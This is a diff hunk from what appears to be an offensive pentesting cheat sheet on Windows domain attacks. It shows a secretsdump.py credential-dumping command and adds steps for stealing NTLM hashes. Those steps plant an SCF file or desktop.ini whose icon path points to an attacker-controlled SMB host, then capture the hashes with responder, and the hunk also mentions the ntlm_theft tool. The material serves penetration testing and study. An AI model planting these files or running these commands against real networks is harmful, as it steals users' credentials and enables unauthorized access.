@@ -3726,23 +3726,34 @@ secretsdump.py domain.local/admin:'Password123'@10.10.10.5 -just-dc-ntlm
 
 If you have some user that can write in SMB you can create a scf file that allow you to obtain the hash NTLM.
 
+When the user open the resource it try to load this type of files, then, with UNC try to obtain the icon in a malicious server.
+
+You can use `scf`, `.lnk`, `url` extension.
+
 Content of **file.scf**. The idea of this type of files is poisoning the icon of the file.
 ```
 [SHELL]
 Command=2
-IconFile=\\<attacker_ip>\smbFolder\malicious.ico
+IconFile=\\<attacker_ip>\smbFolder\malicious.url
 [Taskbar]
 Command=ToggleDesktop
 ```
 
+Also you can test with a `desktop.ini`.
+```
+[.ShellClassInfo] IconResource=\\192.168.1.100\share\folder,0
+```
+
 With smbclient you can upload the file with `put` command
 
-Start a Samba server:
+Use **responder** to listening, if you use impacket-sambaserver it is possible that doesn't give you the hash.
 ```
-impacket-smbserver smbFolder $(pwd) -smb2support
+responder -I tun0 -v
 ```
 
 If any person open the folder where is the file, only with open the folder you obtain the hash NTLM
+
+There are a tool called [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) that generate and test different files to see what is valid.
 
 ---
 
